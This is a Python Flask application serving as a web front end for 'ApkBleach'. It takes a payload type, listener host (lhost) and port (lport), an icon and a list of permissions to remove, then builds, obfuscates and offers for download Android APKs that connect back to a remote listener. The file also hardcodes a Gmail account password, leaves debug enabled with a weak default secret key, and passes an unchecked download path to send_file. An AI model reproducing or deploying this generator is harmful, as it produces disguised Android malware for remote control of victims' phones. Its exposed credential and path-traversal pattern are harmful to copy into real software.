from apkbleach import ApkBleach
from datetime import datetime
from datetime import timedelta
from flask import (
    Flask,
    g,
    request,
    json,
    jsonify,
    render_template,
    redirect,
    url_for,
    send_file,
    session
)
from flask_mail import Message, Mail
import os
from os import path
from PIL import Image
import random
import shutil
import string
from time import sleep

# Instantiating the flask object
app = Flask(__name__)

# Instantiating the mail object
mail = Mail()

# Using a production configuration
# app.config.from_object('config.ProdConfig')

# Using a development configuration
app.config.from_object('config.ProdConfig')

app.config.update(dict(
    SESSION_COOKIE_SAMESITE='Lax',
    FLASK_DEBUG=True,
    SECRET_KEY=os.environ.get('FLASK_SECRET_KEY', 'dev'),
    MAIL_SERVER='smtp.gmail.com',
    MAIL_PORT=465,
    MAIL_USE_TLS=False,
    MAIL_USE_SSL=True,
    MAIL_USERNAME='apkbleach@gmail.com',
    MAIL_PASSWORD='kkzyklruchhpsocz'
))

mail = Mail(app)


@app.before_request
def before_request():
    if request.path == "/":

        letters = string.ascii_lowercase
        g.username = "user_" + ''.join(random.choice(letters)
                                       for i in range(8))

        session.permanent = True
        app.permanent_session_lifetime = timedelta(minutes=3)
        session["user"] = g.username


@app.after_request
def after_request(response):
    file_dir = 'res/cache'
    file_dir_list = os.listdir(file_dir)
    delta = timedelta(minutes=3)
    cutoff = datetime.utcnow() - delta

    for cleanup_file in file_dir_list:
        mtime = datetime.utcfromtimestamp(
            os.path.getmtime(f"{file_dir}/{cleanup_file}"))
        if mtime < cutoff:
            try:
                os.remove(f"{file_dir}/{cleanup_file}")
            except IsADirectoryError:
                shutil.rmtree(f"{file_dir}/{cleanup_file}")

    return response

# View function for the root directory / home page


@app.route("/", methods=['GET', 'POST'])
def home():
    if request.method == 'GET':
        permissions = [
            'ACCESS_WIFI_STATE',
            'CHANGE_WIFI_STATE',
            'ACCESS_NETWORK_STATE',
            'ACCESS_COARSE_LOCATION',
            'ACCESS_FINE_LOCATION',
            'READ_PHONE_STATE',
            'SEND_SMS',
            'RECEIVE_SMS',
            'RECORD_AUDIO',
            'CALL_PHONE',
            'READ_CONTACTS',
            'WRITE_CONTACTS',
            'WRITE_SETTINGS',
            'CAMERA',
            'READ_SMS',
            'WRITE_EXTERNAL_STORAGE',
            'RECEIVE_BOOT_COMPLETED',
            'SET_WALLPAPER',
            'READ_CALL_LOG',
            'WRITE_CALL_LOG',
        ]
        return render_template('home.html', permissions=permissions)

    elif request.method == 'POST':
        if 'user' in session:
            user = session.get("user")

            if 'contact-us' in request.form:
                return_email = request.form['return-email']
                email_subject = request.form['subject']
                email_body = request.form['message-body']
                msg = Message(
                    subject=email_subject,
                    sender=app.config.get("MAIL_USERNAME"),
                    recipients=["apkbleach@gmail.com"],
                    body=f"{return_email} says:\n{email_body}"
                )
                mail.send(msg)

                sleep(2)
                return redirect(url_for('home'))

            if 'generate-app' in request.form:
                output_file = request.form["output"]
                payload = request.form["payload"]
                lhost = request.form["lhost"]
                lport = request.form["lport"]

                if request.form['session-count'] != "":
                    session_count = request.form["session-count"]
                else:
                    session_count = False

                if request.files:
                    icon_file = request.files["icon-file"]
                else:
                    icon_file = False

                args = (user, payload, lhost, lport,
                        session_count, icon_file, output_file)

                start = ApkBleach(*args)
                payload = start.generate_payload()

                if not payload:
                    return redirect(url_for('app_generation_error'))
                else:
                    start.decompile_apk()

                    if "permissions" in request.form:
                        permissions = request.form.getlist("permissions")
                        start.delete_permissions(permissions)

                    start.bleach_apk()
                    payload = start.rebuild_apk()

                    return redirect(url_for('download', app=payload))

        else:
            abort(403, description="Missing user session")


@app.route("/download", methods=['GET', 'POST'])
def download():

    if request.method == 'GET':

        app = request.args.get('app')
        app_name = app.split("/")[-1]

        return render_template('download.html', app=app_name)

    # Handling POST requests
    if request.method == 'POST':
        app = request.args.get('app')
        app_name = app.split("/")[-1]
        payload_dir = app.strip(app_name)

        return send_file(payload_dir + app_name,
                         attachment_filename=app_name,
                         as_attachment=True)


# View function for the root directory / home page
@app.route("/app-generation-error")
def app_generation_error():
    return render_template('app-generation-error.html')


if __name__ == "__main__":
    app.run(host='0.0.0.0')
